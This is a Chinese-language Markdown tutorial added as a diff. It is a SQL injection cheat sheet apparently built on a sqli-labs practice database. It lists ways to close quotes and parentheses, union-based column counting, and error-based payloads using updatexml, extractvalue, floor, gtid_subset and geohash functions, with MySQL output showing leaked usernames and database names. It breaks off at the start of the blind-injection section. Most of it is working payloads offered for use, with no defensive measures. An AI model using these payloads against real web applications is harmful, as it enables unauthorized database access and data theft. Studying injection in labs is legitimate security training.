@@ -1,0 +1,220 @@
+---
+title: "Sql注入"
+date: 2022-01-24
+description: SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中...
+---
+
+## 什么是sql注入？
+
+​	SQL注入即是指[web应用程序](https://baike.baidu.com/item/web应用程序/2498090?fromModule=lemma_inlink)对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的[SQL语句](https://baike.baidu.com/item/SQL语句/5714895?fromModule=lemma_inlink)，在管理员不知情的情况下实现非法操作，以此来实现欺骗[数据库服务器](https://baike.baidu.com/item/数据库服务器/613818?fromModule=lemma_inlink)执行非授权的任意查询，从而进一步得到相应的数据信息。
+
+
+
+## 原理
+
+​	SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对[WEB服务器](https://baike.baidu.com/item/WEB服务器/8390210?fromModule=lemma_inlink)进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。
+
+
+
+## 参数类型
+
+下面例子，假设我们输入的值被赋予到`id`参数，不同的参数类型，**需要用不同的后缀闭合参数**
+
+### 1、数字型
+
+```sql
+select * from users where id=1;
+```
+
+### 2、字符型
+
+```sql
+select * from users where id="1";
+select * from users where id='1';
+```
+
+### 3、扭曲型
+
+```sql
+select * from users where id=('1');
+select * from users where id=(('1'));
+select * from users where id=("1");
+select * from users where id=(("1"));
+```
+
+
+
+### 4、搜索型
+
+```sql
+mysql> select * from users where id like '%1%';
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
+| 10 | admin2   | admin2   |
+| 11 | admin3   | admin3   |
+| 12 | dhakkan  | dumbo    |
+| 14 | admin4   | admin4   |
++----+----------+----------+
+5 rows in set (0.00 sec)
+```
+
+
+
+### 5、insert into型
+
+> 这是我自己分的，对错自辩
+
+```
+INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('参数位置', '$IP', $uname);
+```
+
+闭合
+
+```
+' or '
+```
+
+利用只能报错型，例如
+
+```
+' or updatexml(1,concat(0x7e,database()),1) or '
+```
+
+**update型也一样**
+
+
+
+### 6、order by型
+
+```
+$sql="SELECT * FROM users ORDER BY $id";
+```
+
+利用只能报错型，例如
+
+```
+updatexml(1,concat(0x7e,user()),1)
+```
+
+
+
+## 攻击类型
+
+### 带内(In-Band)SQL注入
+
+#### 1、基于联合查询的(Union-based)SQL注入
+
+> 联合查询查到想要的信息。
+
+```sql
+select * from users where id="1" union select 1,2,3 %23;
+```
+
+union select 后面要跟前面select的**字段数对应**，否则报错。
+
+
+
+##### 查看字段数方法
+
+###### order by
+
+```
+select * from users where id="1" order by 字段数;
+```
+
+在报错与成功执行之间，成功执行的数就是字段数
+
+```sql
+mysql> select * from users where id="1" order by 4;
+ERROR 1054 (42S22): Unknown column '4' in 'order clause'
+mysql> select * from users where id="1" order by 3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+```
+
+###### group by
+
+同上
+
+```
+select * from users where id="1" group by 字段数;
+```
+
+```
+mysql> select * from users where id="1" group by 4;
+ERROR 1054 (42S22): Unknown column '4' in 'group statement'
+mysql> select * from users where id="1" group by 3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+```
+
+
+
+#### 2、基于报错的(Error-based)SQL注入
+
+> 利用页面返回的报错信息，得到想要的信息。
+
+##### gtid_subset报错
+
+> 经过测试mysql-5.7.26版本可用，5.5.29版本不可用
+
+```sql
+mysql> select * from users where id="1" and gtid_subset(user(),1);
+ERROR 1772 (HY000): Malformed GTID set specification 'root@localhost'.
+```
+
+##### floor报错
+
+```sql
+mysql> select * from users where id="1"  union select 1,2,count(*) from information_schema.tables group by concat(floor(rand(0)*2) ,0x7e,user());
+ERROR 1062 (23000): Duplicate entry '1~root@localhost' for key '<group_key>'
+```
+
+##### updatexml报错
+
+```
+mysql> select * from users where id="" or updatexml(1,concat(0x7e,database()),1);
+ERROR 1105 (HY000): XPATH syntax error: '~security'
+```
+
+##### extractvalue报错
+
+```sql
+mysql> select * from users where id=""  or extractvalue(1,concat(0x7e,database()));
+ERROR 1105 (HY000): XPATH syntax error: '~security'
+```
+
+##### exp报错
+
+> MySQL 5.5.49后的版本已经不再生效
+
+```
+exp(~(SELECT * from(select user())a))
+```
+
+##### geometric报错
+
+```sql
+mysql> select ST_LatFromGeoHash((select * from(select * from(select user())a)b));
+ERROR 1411 (HY000): Incorrect geohash value: 'root@localhost' for function ST_LATFROMGEOHASH
+```
+
+
+
+#### 3、盲注
+
+> 参数后面跟**逻辑运算符**和**条件判断**逐个逐个字母判断自己想要的信息
+
+##### 3.1 基于布尔的(Boolean-based)SQL注入
+
+> 根据页面返回的大小，判断条件正确
